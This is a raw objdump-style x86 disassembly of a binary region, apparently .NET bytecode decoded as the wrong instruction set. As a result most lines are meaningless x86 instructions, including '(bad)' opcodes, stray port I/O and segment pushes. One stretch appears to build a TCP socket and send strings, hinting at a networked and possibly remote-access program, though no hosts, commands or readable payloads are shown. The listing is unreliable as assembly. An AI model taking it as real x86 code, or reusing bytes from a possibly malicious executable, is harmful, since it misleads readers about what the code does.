  406456:	02 00                	add    (%eax),%al
  406458:	24 00                	and    $0x0,%al
  40645a:	00 00                	add    %al,(%eax)
  40645c:	25 00 00 11 02       	and    $0x2110000,%eax
  406461:	28 3a                	sub    %bh,(%edx)
  406463:	00 00                	add    %al,(%eax)
  406465:	06                   	push   %es
  406466:	74 09                	je     0x406471
  406468:	00 00                	add    %al,(%eax)
  40646a:	1b 72 c6             	sbb    -0x3a(%edx),%esi
  40646d:	0d 00 70 28 3c       	or     $0x3c287000,%eax
  406472:	00 00                	add    %al,(%eax)
  406474:	06                   	push   %es
  406475:	28 11                	sub    %dl,(%ecx)
  406477:	00 00                	add    %al,(%eax)
  406479:	0a 28                	or     (%eax),%ch
  40647b:	11 00                	adc    %eax,(%eax)
  40647d:	00 0a                	add    %cl,(%edx)
  40647f:	0a 2b                	or     (%ebx),%ch
  406481:	00 06                	add    %al,(%esi)
  406483:	2a 13                	sub    (%ebx),%dl
  406485:	30 03                	xor    %al,(%ebx)
  406487:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40648b:	00 26                	add    %ah,(%esi)
  40648d:	00 00                	add    %al,(%eax)
  40648f:	11 02                	adc    %eax,(%edx)
  406491:	28 e9                	sub    %ch,%cl
  406493:	00 00                	add    %al,(%eax)
  406495:	0a 6f ea             	or     -0x16(%edi),%ch
  406498:	00 00                	add    %al,(%eax)
  40649a:	0a 13                	or     (%ebx),%dl
  40649c:	04 16                	add    $0x16,%al
  40649e:	0d 2b 56 11 04       	or     $0x411562b,%eax
  4064a3:	09 9a 0a 06 6f eb    	or     %ebx,-0x1490f9f6(%edx)
  4064a9:	00 00                	add    %al,(%eax)
  4064ab:	0a 13                	or     (%ebx),%dl
  4064ad:	06                   	push   %es
  4064ae:	16                   	push   %ss
  4064af:	13 05 2b 38 11 06    	adc    0x611382b,%eax
  4064b5:	11 05 9a 0c 08 6f    	adc    %eax,0x6f080c9a
  4064bb:	ec                   	in     (%dx),%al
  4064bc:	00 00                	add    %al,(%eax)
  4064be:	0a 72 d4             	or     -0x2c(%edx),%dh
  4064c1:	0d 00 70 03 28       	or     $0x28037000,%eax
  4064c6:	47                   	inc    %edi
  4064c7:	00 00                	add    %al,(%eax)
  4064c9:	0a 6f ed             	or     -0x13(%edi),%ch
  4064cc:	00 00                	add    %al,(%eax)
  4064ce:	0a 2c 14             	or     (%esp,%edx,1),%ch
  4064d1:	06                   	push   %es
  4064d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d3:	ee                   	out    %al,(%dx)
  4064d4:	00 00                	add    %al,(%eax)
  4064d6:	0a 08                	or     (%eax),%cl
  4064d8:	6f                   	outsl  %ds:(%esi),(%dx)
  4064d9:	ec                   	in     (%dx),%al
  4064da:	00 00                	add    %al,(%eax)
  4064dc:	0a 6f ef             	or     -0x11(%edi),%ch
  4064df:	00 00                	add    %al,(%eax)
  4064e1:	0a 0b                	or     (%ebx),%cl
  4064e3:	2b 1d 11 05 17 d6    	sub    0xd6170511,%ebx
  4064e9:	13 05 11 05 11 06    	adc    0x6110511,%eax
  4064ef:	8e b7 32 c0 09 17    	mov    0x1709c032(%edi),%?
  4064f5:	d6                   	salc
  4064f6:	0d 09 11 04 8e       	or     $0x8e041109,%eax
  4064fb:	b7 32                	mov    $0x32,%bh
  4064fd:	a3 14 0b 2b 00       	mov    %eax,0x2b0b14
  406502:	07                   	pop    %es
  406503:	2a 1b                	sub    (%ebx),%bl
  406505:	30 04 00             	xor    %al,(%eax,%eax,1)
  406508:	55                   	push   %ebp
  406509:	00 00                	add    %al,(%eax)
  40650b:	00 27                	add    %ah,(%edi)
  40650d:	00 00                	add    %al,(%eax)
  40650f:	11 73 f0             	adc    %esi,-0x10(%ebx)
  406512:	00 00                	add    %al,(%eax)
  406514:	0a 0a                	or     (%edx),%cl
  406516:	73 df                	jae    0x4064f7
  406518:	00 00                	add    %al,(%eax)
  40651a:	0a 0c 06             	or     (%esi,%eax,1),%cl
  40651d:	08 7e 08             	or     %bh,0x8(%esi)
  406520:	00 00                	add    %al,(%eax)
  406522:	04 28                	add    $0x28,%al
  406524:	36 00 00             	add    %al,%ss:(%eax)
  406527:	06                   	push   %es
  406528:	6f                   	outsl  %ds:(%esi),(%dx)
  406529:	e1 00                	loope  0x40652b
  40652b:	00 0a                	add    %cl,(%edx)
  40652d:	6f                   	outsl  %ds:(%esi),(%dx)
  40652e:	f1                   	int1
  40652f:	00 00                	add    %al,(%eax)
  406531:	0a 06                	or     (%esi),%al
  406533:	18 6f f2             	sbb    %ch,-0xe(%edi)
  406536:	00 00                	add    %al,(%eax)
  406538:	0a 06                	or     (%esi),%al
  40653a:	6f                   	outsl  %ds:(%esi),(%dx)
  40653b:	f3 00 00             	repz add %al,(%eax)
  40653e:	0a 13                	or     (%ebx),%dl
  406540:	04 02                	add    $0x2,%al
  406542:	0d 11 04 09 16       	or     $0x16090411,%eax
  406547:	09 8e b7 6f f4 00    	or     %ecx,0xf46fb7(%esi)
  40654d:	00 0a                	add    %cl,(%edx)
  40654f:	0b de                	or     %esi,%ebx
  406551:	11 de                	adc    %ebx,%esi
  406553:	0f 25                	(bad)
  406555:	28 29                	sub    %ch,(%ecx)
  406557:	00 00                	add    %al,(%eax)
  406559:	0a 13                	or     (%ebx),%dl
  40655b:	05 28 2a 00 00       	add    $0x2a28,%eax
  406560:	0a de                	or     %dh,%bl
  406562:	00 07                	add    %al,(%edi)
  406564:	2a 00                	sub    (%eax),%al
  406566:	00 00                	add    %al,(%eax)
  406568:	01 10                	add    %edx,(%eax)
  40656a:	00 00                	add    %al,(%eax)
  40656c:	00 00                	add    %al,(%eax)
  40656e:	0c 00                	or     $0x0,%al
  406570:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  406574:	24 00                	and    $0x0,%al
  406576:	00 01                	add    %al,(%ecx)
  406578:	1b 30                	sbb    (%eax),%esi
  40657a:	04 00                	add    $0x0,%al
  40657c:	55                   	push   %ebp
  40657d:	00 00                	add    %al,(%eax)
  40657f:	00 28                	add    %ch,(%eax)
  406581:	00 00                	add    %al,(%eax)
  406583:	11 73 f0             	adc    %esi,-0x10(%ebx)
  406586:	00 00                	add    %al,(%eax)
  406588:	0a 0a                	or     (%edx),%cl
  40658a:	73 df                	jae    0x40656b
  40658c:	00 00                	add    %al,(%eax)
  40658e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  406591:	08 7e 08             	or     %bh,0x8(%esi)
  406594:	00 00                	add    %al,(%eax)
  406596:	04 28                	add    $0x28,%al
  406598:	36 00 00             	add    %al,%ss:(%eax)
  40659b:	06                   	push   %es
  40659c:	6f                   	outsl  %ds:(%esi),(%dx)
  40659d:	e1 00                	loope  0x40659f
  40659f:	00 0a                	add    %cl,(%edx)
  4065a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4065a2:	f1                   	int1
  4065a3:	00 00                	add    %al,(%eax)
  4065a5:	0a 06                	or     (%esi),%al
  4065a7:	18 6f f2             	sbb    %ch,-0xe(%edi)
  4065aa:	00 00                	add    %al,(%eax)
  4065ac:	0a 06                	or     (%esi),%al
  4065ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4065af:	f5                   	cmc
  4065b0:	00 00                	add    %al,(%eax)
  4065b2:	0a 13                	or     (%ebx),%dl
  4065b4:	04 02                	add    $0x2,%al
  4065b6:	0d 11 04 09 16       	or     $0x16090411,%eax
  4065bb:	09 8e b7 6f f4 00    	or     %ecx,0xf46fb7(%esi)
  4065c1:	00 0a                	add    %cl,(%edx)
  4065c3:	0b de                	or     %esi,%ebx
  4065c5:	11 de                	adc    %ebx,%esi
  4065c7:	0f 25                	(bad)
  4065c9:	28 29                	sub    %ch,(%ecx)
  4065cb:	00 00                	add    %al,(%eax)
  4065cd:	0a 13                	or     (%ebx),%dl
  4065cf:	05 28 2a 00 00       	add    $0x2a28,%eax
  4065d4:	0a de                	or     %dh,%bl
  4065d6:	00 07                	add    %al,(%edi)
  4065d8:	2a 00                	sub    (%eax),%al
  4065da:	00 00                	add    %al,(%eax)
  4065dc:	01 10                	add    %edx,(%eax)
  4065de:	00 00                	add    %al,(%eax)
  4065e0:	00 00                	add    %al,(%eax)
  4065e2:	0c 00                	or     $0x0,%al
  4065e4:	38 44 00 0f          	cmp    %al,0xf(%eax,%eax,1)
  4065e8:	24 00                	and    $0x0,%al
  4065ea:	00 01                	add    %al,(%ecx)
  4065ec:	1b 30                	sbb    (%eax),%esi
  4065ee:	02 00                	add    (%eax),%al
  4065f0:	40                   	inc    %eax
  4065f1:	00 00                	add    %al,(%eax)
  4065f3:	00 29                	add    %ch,(%ecx)
  4065f5:	00 00                	add    %al,(%eax)
  4065f7:	11 7e 0e             	adc    %edi,0xe(%esi)
  4065fa:	00 00                	add    %al,(%eax)
  4065fc:	04 73                	add    $0x73,%al
  4065fe:	27                   	daa
  4065ff:	00 00                	add    %al,(%eax)
  406601:	0a 0b                	or     (%ebx),%cl
  406603:	07                   	pop    %es
  406604:	6f                   	outsl  %ds:(%esi),(%dx)
  406605:	f6 00 00             	testb  $0x0,(%eax)
  406608:	0a 0d 12 03 72 d8    	or     0xd8720312,%cl
  40660e:	0d 00 70 28 f7       	or     $0xf7287000,%eax
  406613:	00 00                	add    %al,(%eax)
  406615:	0a 0a                	or     (%edx),%cl
  406617:	de 1d de 1b 25 28    	ficomps 0x28251bde
  40661d:	29 00                	sub    %eax,(%eax)
  40661f:	00 0a                	add    %cl,(%edx)
  406621:	0c 72                	or     $0x72,%al
  406623:	75 05                	jne    0x40662a
  406625:	00 70 0a             	add    %dh,0xa(%eax)
  406628:	28 2a                	sub    %ch,(%edx)
  40662a:	00 00                	add    %al,(%eax)
  40662c:	0a de                	or     %dh,%bl
  40662e:	07                   	pop    %es
  40662f:	28 2a                	sub    %ch,(%edx)
  406631:	00 00                	add    %al,(%eax)
  406633:	0a de                	or     %dh,%bl
  406635:	00 06                	add    %al,(%esi)
  406637:	2a 01                	sub    (%ecx),%al
  406639:	10 00                	adc    %al,(%eax)
  40663b:	00 00                	add    %al,(%eax)
  40663d:	00 00                	add    %al,(%eax)
  40663f:	00 23                	add    %ah,(%ebx)
  406641:	23 00                	and    (%eax),%eax
  406643:	1b 24 00             	sbb    (%eax,%eax,1),%esp
  406646:	00 01                	add    %al,(%ecx)
  406648:	1b 30                	sbb    (%eax),%esi
  40664a:	03 00                	add    (%eax),%eax
  40664c:	49                   	dec    %ecx
  40664d:	00 00                	add    %al,(%eax)
  40664f:	00 2a                	add    %ch,(%edx)
  406651:	00 00                	add    %al,(%eax)
  406653:	11 7e 0e             	adc    %edi,0xe(%esi)
  406656:	00 00                	add    %al,(%eax)
  406658:	04 28                	add    $0x28,%al
  40665a:	24 00                	and    $0x0,%al
  40665c:	00 0a                	add    %cl,(%edx)
  40665e:	7e 0a                	jle    0x40666a
  406660:	00 00                	add    %al,(%eax)
  406662:	04 16                	add    $0x16,%al
  406664:	28 69 00             	sub    %ch,0x0(%ecx)
  406667:	00 0a                	add    %cl,(%edx)
  406669:	16                   	push   %ss
  40666a:	33 0a                	xor    (%edx),%ecx
  40666c:	72 e3                	jb     0x406651
  40666e:	00 00                	add    %al,(%eax)
  406670:	70 0a                	jo     0x40667c
  406672:	de 27                	fisubs (%edi)
  406674:	2b 08                	sub    (%eax),%ecx
  406676:	72 cb                	jb     0x406643
  406678:	00 00                	add    %al,(%eax)
  40667a:	70 0a                	jo     0x406686
  40667c:	de 1d de 1b 25 28    	ficomps 0x28251bde
  406682:	29 00                	sub    %eax,(%eax)
  406684:	00 0a                	add    %cl,(%edx)
  406686:	0b 72 75             	or     0x75(%edx),%esi
  406689:	05 00 70 0a 28       	add    $0x280a7000,%eax
  40668e:	2a 00                	sub    (%eax),%al
  406690:	00 0a                	add    %cl,(%edx)
  406692:	de 07                	fiadds (%edi)
  406694:	28 2a                	sub    %ch,(%edx)
  406696:	00 00                	add    %al,(%eax)
  406698:	0a de                	or     %dh,%bl
  40669a:	00 06                	add    %al,(%esi)
  40669c:	2a 00                	sub    (%eax),%al
  40669e:	00 00                	add    %al,(%eax)
  4066a0:	01 10                	add    %edx,(%eax)
  4066a2:	00 00                	add    %al,(%eax)
  4066a4:	00 00                	add    %al,(%eax)
  4066a6:	00 00                	add    %al,(%eax)
  4066a8:	2c 2c                	sub    $0x2c,%al
  4066aa:	00 1b                	add    %bl,(%ebx)
  4066ac:	24 00                	and    $0x0,%al
  4066ae:	00 01                	add    %al,(%ecx)
  4066b0:	1b 30                	sbb    (%eax),%esi
  4066b2:	02 00                	add    (%eax),%al
  4066b4:	3e 00 00             	add    %al,%ds:(%eax)
  4066b7:	00 2b                	add    %ch,(%ebx)
  4066b9:	00 00                	add    %al,(%eax)
  4066bb:	11 28                	adc    %ebp,(%eax)
  4066bd:	f8                   	clc
  4066be:	00 00                	add    %al,(%eax)
  4066c0:	0a 73 f9             	or     -0x7(%ebx),%dh
  4066c3:	00 00                	add    %al,(%eax)
  4066c5:	0a 20                	or     (%eax),%ah
  4066c7:	20 02                	and    %al,(%edx)
  4066c9:	00 00                	add    %al,(%eax)
  4066cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4066cc:	fa                   	cli
  4066cd:	00 00                	add    %al,(%eax)
  4066cf:	0a 0c 12             	or     (%edx,%edx,1),%cl
  4066d2:	02 28                	add    (%eax),%ch
  4066d4:	49                   	dec    %ecx
  4066d5:	00 00                	add    %al,(%eax)
  4066d7:	0a 0a                	or     (%edx),%cl
  4066d9:	de 1d de 1b 25 28    	ficomps 0x28251bde
  4066df:	29 00                	sub    %eax,(%eax)
  4066e1:	00 0a                	add    %cl,(%edx)
  4066e3:	0b 72 75             	or     0x75(%edx),%esi
  4066e6:	05 00 70 0a 28       	add    $0x280a7000,%eax
  4066eb:	2a 00                	sub    (%eax),%al
  4066ed:	00 0a                	add    %cl,(%edx)
  4066ef:	de 07                	fiadds (%edi)
  4066f1:	28 2a                	sub    %ch,(%edx)
  4066f3:	00 00                	add    %al,(%eax)
  4066f5:	0a de                	or     %dh,%bl
  4066f7:	00 06                	add    %al,(%esi)
  4066f9:	2a 00                	sub    (%eax),%al
  4066fb:	00 01                	add    %al,(%ecx)
  4066fd:	10 00                	adc    %al,(%eax)
  4066ff:	00 00                	add    %al,(%eax)
  406701:	00 00                	add    %al,(%eax)
  406703:	00 21                	add    %ah,(%ecx)
  406705:	21 00                	and    %eax,(%eax)
  406707:	1b 24 00             	sbb    (%eax,%eax,1),%esp
  40670a:	00 01                	add    %al,(%ecx)
  40670c:	1b 30                	sbb    (%eax),%esi
  40670e:	03 00                	add    (%eax),%eax
  406710:	58                   	pop    %eax
  406711:	00 00                	add    %al,(%eax)
  406713:	00 2c 00             	add    %ch,(%eax,%eax,1)
  406716:	00 11                	add    %dl,(%ecx)
  406718:	72 39                	jb     0x406753
  40671a:	08 00                	or     %al,(%eax)
  40671c:	70 28                	jo     0x406746
  40671e:	38 00                	cmp    %al,(%eax)
  406720:	00 06                	add    %al,(%esi)
  406722:	28 47 00             	sub    %al,0x0(%edi)
  406725:	00 0a                	add    %cl,(%edx)
  406727:	72 45                	jb     0x40676e
  406729:	0a 00                	or     (%eax),%al
  40672b:	70 14                	jo     0x406741
  40672d:	28 bb 00 00 0a 28    	sub    %bh,0x280a0000(%ebx)
  406733:	3b 00                	cmp    (%eax),%eax
  406735:	00 0a                	add    %cl,(%edx)
  406737:	0b 07                	or     (%edi),%eax
  406739:	14 16                	adc    $0x16,%al
  40673b:	28 69 00             	sub    %ch,0x0(%ecx)
  40673e:	00 0a                	add    %cl,(%edx)
  406740:	16                   	push   %ss
  406741:	33 0a                	xor    (%edx),%ecx
  406743:	72 ec                	jb     0x406731
  406745:	0d 00 70 0a de       	or     $0xde0a7000,%eax
  40674a:	23 2b                	and    (%ebx),%ebp
  40674c:	04 07                	add    $0x7,%al
  40674e:	0a de                	or     %dh,%bl
  406750:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  406755:	29 00                	sub    %eax,(%eax)
  406757:	00 0a                	add    %cl,(%edx)
  406759:	0c 72                	or     $0x72,%al
  40675b:	75 05                	jne    0x406762
  40675d:	00 70 0a             	add    %dh,0xa(%eax)
  406760:	28 2a                	sub    %ch,(%edx)
  406762:	00 00                	add    %al,(%eax)
  406764:	0a de                	or     %dh,%bl
  406766:	07                   	pop    %es
  406767:	28 2a                	sub    %ch,(%edx)
  406769:	00 00                	add    %al,(%eax)
  40676b:	0a de                	or     %dh,%bl
  40676d:	00 06                	add    %al,(%esi)
  40676f:	2a 01                	sub    (%ecx),%al
  406771:	10 00                	adc    %al,(%eax)
  406773:	00 00                	add    %al,(%eax)
  406775:	00 00                	add    %al,(%eax)
  406777:	00 3b                	add    %bh,(%ebx)
  406779:	3b 00                	cmp    (%eax),%eax
  40677b:	1b 24 00             	sbb    (%eax,%eax,1),%esp
  40677e:	00 01                	add    %al,(%ecx)
  406780:	1b 30                	sbb    (%eax),%esi
  406782:	04 00                	add    $0x0,%al
  406784:	cf                   	iret
  406785:	00 00                	add    %al,(%eax)
  406787:	00 2d 00 00 11 72    	add    %ch,0x72110000
  40678d:	fc                   	cld
  40678e:	0d 00 70 28 da       	or     $0xda287000,%eax
  406793:	00 00                	add    %al,(%eax)
  406795:	0a 72 02             	or     0x2(%edx),%dh
  406798:	0e                   	push   %cs
  406799:	00 70 28             	add    %dh,0x28(%eax)
  40679c:	25 00 00 0a 72       	and    $0x720a0000,%eax
  4067a1:	2e 0e                	cs push %cs
  4067a3:	00 70 73             	add    %dh,0x73(%eax)
  4067a6:	fb                   	sti
  4067a7:	00 00                	add    %al,(%eax)
  4067a9:	0a 0b                	or     (%ebx),%cl
  4067ab:	73 e2                	jae    0x40678f
  4067ad:	00 00                	add    %al,(%eax)
  4067af:	0a 0c 07             	or     (%edi,%eax,1),%cl
  4067b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4067b3:	fc                   	cld
  4067b4:	00 00                	add    %al,(%eax)
  4067b6:	0a 6f fd             	or     -0x3(%edi),%ch
  4067b9:	00 00                	add    %al,(%eax)
  4067bb:	0a 13                	or     (%ebx),%dl
  4067bd:	05 2b 2b 11 05       	add    $0x5112b2b,%eax
  4067c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4067c3:	fe 00                	incb   (%eax)
  4067c5:	00 0a                	add    %cl,(%edx)
  4067c7:	0d 08 09 72 6c       	or     $0x6c720908,%eax
  4067cc:	0e                   	push   %cs
  4067cd:	00 70 6f             	add    %dh,0x6f(%eax)
  4067d0:	ff 00                	incl   (%eax)
  4067d2:	00 0a                	add    %cl,(%edx)
  4067d4:	6f                   	outsl  %ds:(%esi),(%dx)
  4067d5:	15 00 00 0a 6f       	adc    $0x6f0a0000,%eax
  4067da:	e4 00                	in     $0x0,%al
  4067dc:	00 0a                	add    %cl,(%edx)
  4067de:	26 08 72 84          	or     %dh,%es:-0x7c(%edx)
  4067e2:	0e                   	push   %cs
  4067e3:	00 70 6f             	add    %dh,0x6f(%eax)
  4067e6:	e4 00                	in     $0x0,%al
  4067e8:	00 0a                	add    %cl,(%edx)
  4067ea:	26 11 05 6f 00 01 00 	adc    %eax,%es:0x1006f
  4067f1:	0a 2d cc de 0c 11    	or     0x110cdecc,%ch
  4067f7:	05 2c 07 11 05       	add    $0x511072c,%eax
  4067fc:	6f                   	outsl  %ds:(%esi),(%dx)
  4067fd:	59                   	pop    %ecx
  4067fe:	00 00                	add    %al,(%eax)
  406800:	0a dc                	or     %ah,%bl
  406802:	08 6f e5             	or     %ch,-0x1b(%edi)
  406805:	00 00                	add    %al,(%eax)
  406807:	0a 6f 01             	or     0x1(%edi),%ch
  40680a:	01 00                	add    %eax,(%eax)
  40680c:	0a 16                	or     (%esi),%dl
  40680e:	33 08                	xor    (%eax),%ecx
  406810:	72 88                	jb     0x40679a
  406812:	0e                   	push   %cs
  406813:	00 70 0a             	add    %dh,0xa(%eax)
  406816:	de 41 08             	fiadds 0x8(%ecx)
  406819:	6f                   	outsl  %ds:(%esi),(%dx)
  40681a:	e5 00                	in     $0x0,%eax
  40681c:	00 0a                	add    %cl,(%edx)
  40681e:	16                   	push   %ss
  40681f:	08 6f 02             	or     %ch,0x2(%edi)
  406822:	01 00                	add    %eax,(%eax)
  406824:	0a 17                	or     (%edi),%dl
  406826:	da 6f e6             	fisubrl -0x1a(%edi)
  406829:	00 00                	add    %al,(%eax)
  40682b:	0a 0a                	or     (%edx),%cl
  40682d:	de 2a                	fisubrs (%edx)
  40682f:	de 0a                	fimuls (%edx)
  406831:	07                   	pop    %es
  406832:	2c 06                	sub    $0x6,%al
  406834:	07                   	pop    %es
  406835:	6f                   	outsl  %ds:(%esi),(%dx)
  406836:	59                   	pop    %ecx
  406837:	00 00                	add    %al,(%eax)
  406839:	0a dc                	or     %ah,%bl
  40683b:	de 1c 25 28 29 00 00 	ficomps 0x2928(,%eiz,1)
  406842:	0a 13                	or     (%ebx),%dl
  406844:	04 72                	add    $0x72,%al
  406846:	88 0e                	mov    %cl,(%esi)
  406848:	00 70 0a             	add    %dh,0xa(%eax)
  40684b:	28 2a                	sub    %ch,(%edx)
  40684d:	00 00                	add    %al,(%eax)
  40684f:	0a de                	or     %dh,%bl
  406851:	07                   	pop    %es
  406852:	28 2a                	sub    %ch,(%edx)
  406854:	00 00                	add    %al,(%eax)
  406856:	0a de                	or     %dh,%bl
  406858:	00 06                	add    %al,(%esi)
  40685a:	2a 00                	sub    (%eax),%al
  40685c:	01 28                	add    %ebp,(%eax)
  40685e:	00 00                	add    %al,(%eax)
  406860:	02 00                	add    (%eax),%al
  406862:	25 00 45 6a 00       	and    $0x6a4500,%eax
  406867:	0c 00                	or     $0x0,%al
  406869:	00 00                	add    %al,(%eax)
  40686b:	00 02                	add    %al,(%edx)
  40686d:	00 1f                	add    %bl,(%edi)
  40686f:	00 86 a5 00 0a 00    	add    %al,0xa00a5(%esi)
  406875:	00 00                	add    %al,(%eax)
  406877:	00 00                	add    %al,(%eax)
  406879:	00 00                	add    %al,(%eax)
  40687b:	00 b1 b1 00 1c 24    	add    %dh,0x241c00b1(%ecx)
  406881:	00 00                	add    %al,(%eax)
  406883:	01 13                	add    %edx,(%ebx)
  406885:	30 03                	xor    %al,(%ebx)
  406887:	00 18                	add    %bl,(%eax)
  406889:	00 00                	add    %al,(%eax)
  40688b:	00 2e                	add    %ch,(%esi)
  40688d:	00 00                	add    %al,(%eax)
  40688f:	11 16                	adc    %edx,(%esi)
  406891:	7e 0b                	jle    0x40689e
  406893:	00 00                	add    %al,(%eax)
  406895:	04 12                	add    $0x12,%al
  406897:	00 73 03             	add    %dh,0x3(%ebx)
  40689a:	01 00                	add    %eax,(%eax)
  40689c:	0a 80 0c 00 00 04    	or     0x400000c(%eax),%al
  4068a2:	06                   	push   %es
  4068a3:	0b 2b                	or     (%ebx),%ebp
  4068a5:	00 07                	add    %al,(%edi)
  4068a7:	2a 62 7e             	sub    0x7e(%edx),%ah
  4068aa:	0c 00                	or     $0x0,%al
  4068ac:	00 04 2c             	add    %al,(%esp,%ebp,1)
  4068af:	10 7e 0c             	adc    %bh,0xc(%esi)
  4068b2:	00 00                	add    %al,(%eax)
  4068b4:	04 6f                	add    $0x6f,%al
  4068b6:	04 01                	add    $0x1,%al
  4068b8:	00 0a                	add    %cl,(%edx)
  4068ba:	14 80                	adc    $0x80,%al
  4068bc:	0c 00                	or     $0x0,%al
  4068be:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4068c1:	00 00                	add    %al,(%eax)
  4068c3:	00 13                	add    %dl,(%ebx)
  4068c5:	30 02                	xor    %al,(%edx)
  4068c7:	00 25 00 00 00 2f    	add    %ah,0x2f000000
  4068cd:	00 00                	add    %al,(%eax)
  4068cf:	11 2b                	adc    %ebp,(%ebx)
  4068d1:	1e                   	push   %ds
  4068d2:	14 fe                	adc    $0xfe,%al
  4068d4:	06                   	push   %es
  4068d5:	48                   	dec    %eax
  4068d6:	00 00                	add    %al,(%eax)
  4068d8:	06                   	push   %es
  4068d9:	73 2b                	jae    0x406906
  4068db:	00 00                	add    %al,(%eax)
  4068dd:	0a 73 2c             	or     0x2c(%ebx),%dh
  4068e0:	00 00                	add    %al,(%eax)
  4068e2:	0a 0b                	or     (%ebx),%cl
  4068e4:	07                   	pop    %es
  4068e5:	6f                   	outsl  %ds:(%esi),(%dx)
  4068e6:	2d 00 00 0a 07       	sub    $0x70a0000,%eax
  4068eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4068ec:	2e 00 00             	add    %al,%cs:(%eax)
  4068ef:	0a 17                	or     (%edi),%dl
  4068f1:	2d df 06 2a 00       	sub    $0x2a06df,%eax
  4068f6:	00 00                	add    %al,(%eax)
  4068f8:	1b 30                	sbb    (%eax),%esi
  4068fa:	02 00                	add    (%eax),%al
  4068fc:	29 00                	sub    %eax,(%eax)
  4068fe:	00 00                	add    %al,(%eax)
  406900:	30 00                	xor    %al,(%eax)
  406902:	00 11                	add    %dl,(%ecx)
  406904:	02 73 05             	add    0x5(%ebx),%dh
  406907:	01 00                	add    %eax,(%eax)
  406909:	0a 6f 06             	or     0x6(%edi),%ch
  40690c:	01 00                	add    %eax,(%eax)
  40690e:	0a 0a                	or     (%edx),%cl
  406910:	de 19                	ficomps (%ecx)
  406912:	de 17                	ficoms (%edi)
  406914:	25 28 29 00 00       	and    $0x2928,%eax
  406919:	0a 0b                	or     (%ebx),%cl
  40691b:	02 0a                	add    (%edx),%cl
  40691d:	28 2a                	sub    %ch,(%edx)
  40691f:	00 00                	add    %al,(%eax)
  406921:	0a de                	or     %dh,%bl
  406923:	07                   	pop    %es
  406924:	28 2a                	sub    %ch,(%edx)
  406926:	00 00                	add    %al,(%eax)
  406928:	0a de                	or     %dh,%bl
  40692a:	00 06                	add    %al,(%esi)
  40692c:	2a 00                	sub    (%eax),%al
  40692e:	00 00                	add    %al,(%eax)
  406930:	01 10                	add    %edx,(%eax)
  406932:	00 00                	add    %al,(%eax)
  406934:	00 00                	add    %al,(%eax)
  406936:	00 00                	add    %al,(%eax)
  406938:	10 10                	adc    %dl,(%eax)
  40693a:	00 17                	add    %dl,(%edi)
  40693c:	24 00                	and    $0x0,%al
  40693e:	00 01                	add    %al,(%ecx)
  406940:	1b 30                	sbb    (%eax),%esi
  406942:	05 00 9d 00 00       	add    $0x9d00,%eax
  406947:	00 31                	add    %dh,(%ecx)
  406949:	00 00                	add    %al,(%eax)
  40694b:	11 18                	adc    %ebx,(%eax)
  40694d:	17                   	pop    %ss
  40694e:	1c 73                	sbb    $0x73,%al
  406950:	35 00 00 0a 0c       	xor    $0xc0a0000,%eax
  406955:	08 7e 25             	or     %bh,0x25(%esi)
  406958:	00 00                	add    %al,(%eax)
  40695a:	04 7e                	add    $0x7e,%al
  40695c:	26 00 00             	add    %al,%es:(%eax)
  40695f:	04 28                	add    $0x28,%al
  406961:	80 00 00             	addb   $0x0,(%eax)
  406964:	0a 6f 3a             	or     0x3a(%edi),%ch
  406967:	00 00                	add    %al,(%eax)
  406969:	0a 1b                	or     (%ebx),%bl
  40696b:	8d 28                	lea    (%eax),%ebp
  40696d:	00 00                	add    %al,(%eax)
  40696f:	01 13                	add    %edx,(%ebx)
  406971:	04 11                	add    $0x11,%al
  406973:	04 16                	add    $0x16,%al
  406975:	72 92                	jb     0x406909
  406977:	0e                   	push   %cs
  406978:	00 70 a2             	add    %dh,-0x5e(%eax)
  40697b:	11 04 17             	adc    %eax,(%edi,%edx,1)
  40697e:	7e 25                	jle    0x4069a5
  406980:	00 00                	add    %al,(%eax)
  406982:	04 a2                	add    $0xa2,%al
  406984:	11 04 18             	adc    %eax,(%eax,%ebx,1)
  406987:	72 c2                	jb     0x40694b
  406989:	0e                   	push   %cs
  40698a:	00 70 a2             	add    %dh,-0x5e(%eax)
  40698d:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
  406990:	7e 24                	jle    0x4069b6
  406992:	00 00                	add    %al,(%eax)
  406994:	04 73                	add    $0x73,%al
  406996:	2f                   	das
  406997:	00 00                	add    %al,(%eax)
  406999:	0a 7e 24             	or     0x24(%esi),%bh
  40699c:	00 00                	add    %al,(%eax)
  40699e:	04 8e                	add    $0x8e,%al
  4069a0:	b7 6f                	mov    $0x6f,%bh
  4069a2:	07                   	pop    %es
  4069a3:	01 00                	add    %eax,(%eax)
  4069a5:	0a 9a a2 11 04 1a    	or     0x1a0411a2(%edx),%bl
  4069ab:	72 73                	jb     0x406a20
  4069ad:	0f 00                	(bad)
  4069af:	70 a2                	jo     0x406953
  4069b1:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4069b4:	9c                   	pushf
  4069b5:	00 00                	add    %al,(%eax)
  4069b7:	0a 0b                	or     (%ebx),%cl
  4069b9:	28 08                	sub    %cl,(%eax)
  4069bb:	01 00                	add    %eax,(%eax)
  4069bd:	0a 07                	or     (%edi),%al
  4069bf:	6f                   	outsl  %ds:(%esi),(%dx)
  4069c0:	d7                   	xlat   %ds:(%ebx)
  4069c1:	00 00                	add    %al,(%eax)
  4069c3:	0a 0a                	or     (%edx),%cl
  4069c5:	08 06                	or     %al,(%esi)
  4069c7:	16                   	push   %ss
  4069c8:	06                   	push   %es
  4069c9:	8e b7 16 6f 09 01    	mov    0x1096f16(%edi),%?
  4069cf:	00 0a                	add    %cl,(%edx)
  4069d1:	26 08 6f 5f          	or     %ch,%es:0x5f(%edi)
  4069d5:	00 00                	add    %al,(%eax)
  4069d7:	0a de                	or     %dh,%bl
  4069d9:	0e                   	push   %cs
  4069da:	25 28 29 00 00       	and    $0x2928,%eax
  4069df:	0a 0d 28 2a 00 00    	or     0x2a28,%cl
  4069e5:	0a de                	or     %dh,%bl
  4069e7:	00 2a                	add    %ch,(%edx)
